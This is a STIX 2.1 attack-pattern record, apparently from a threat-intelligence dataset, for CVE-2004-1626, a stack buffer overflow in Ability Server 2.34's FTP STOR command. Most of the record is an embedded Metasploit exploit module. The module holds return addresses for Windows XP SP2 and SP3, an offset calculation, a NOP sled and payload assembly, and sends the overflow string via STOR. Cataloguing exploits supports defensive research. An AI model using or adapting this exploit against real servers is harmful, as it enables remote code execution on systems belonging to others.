{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d8a0ce98-dd81-4061-8a0a-1b405821051a",
    "created": "2024-08-14T16:50:40.868269Z",
    "modified": "2024-08-14T16:50:40.868273Z",
    "name": "Ability Server 2.34 STOR Command Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in Ability Server 2.34. Ability Server fails to check input size when parsing 'STOR' and 'APPE' commands which leads to a stack based buffer overflow. This plugin uses the 'STOR' command.  The vulnerability has been confirmed on version 2.34 and has also been reported in version 2.25 and 2.32. Other versions may also be affected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/ability_server_stor.rb",
            "external_id": "ability_server_stor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1626"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ability Server 2.34 STOR Command Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack-based buffer overflow in Ability Server 2.34.\n        Ability Server fails to check input size when parsing 'STOR' and 'APPE' commands,\n        which leads to a stack based buffer overflow. This plugin uses the 'STOR' command.\n\n        The vulnerability has been confirmed on version 2.34 and has also been reported\n        in version 2.25 and 2.32. Other versions may also be affected.\n      },\n      'Author'         =>\n        [\n          'muts',           #Initial discovery\n          'Dark Eagle',     #same as muts\n          'Peter Osterberg' #Metasploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-1626' ],\n          [ 'OSVDB', '11030'],\n          [ 'EDB', '588'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\\xff\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP2 ENG',\n            {\n              #JMP ESP  (MFC42.dll. Addr remains unchanged until a patched SP3)\n              'Ret' => 0x73E32ECF,\n              'Offset' => 966\n            }\n          ],\n          [\n            'Windows XP SP3 ENG',\n            {\n              #JMP ESP  (USER32.dll. Unchanged unpatched SP3 - fully pathced)\n              'Ret' => 0x7E429353,\n              'Offset' => 966\n            }\n          ],\n        ],\n      'DisclosureDate' => '2004-10-22'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(21),\n        OptString.new('FTPUSER', [ true, 'Valid FTP username', 'ftp' ], fallbacks: ['USERNAME']),\n        OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'ftp' ], fallbacks: ['PASSWORD'])\n      ])\n    end\n\n  def check\n    connect\n    disconnect\n    if banner =~ /Ability Server 2\\.34/\n      return Exploit::CheckCode::Appears\n    else\n      if banner =~ /Ability Server/\n        return Exploit::CheckCode::Detected\n      end\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    c = connect_login\n    return if not c\n\n    myhost = datastore['LHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['LHOST']\n\n    # Take client ip + ftp user lengths into account for EIP offset\n    padd_size = target['Offset'] + (13 - myhost.length) + (3 - datastore['FTPUSER'].length)\n    junk = rand_text_alpha(padd_size)\n\n    sploit = junk\n    sploit << [target.ret].pack('V')\n    sploit << make_nops(32)\n    sploit << payload.encoded\n    sploit << rand_text_alpha(sploit.length)\n\n    send_cmd(['STOR', sploit], false)\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-10-22",
    "x_mitre_platforms": [
        "win'"
    ]
}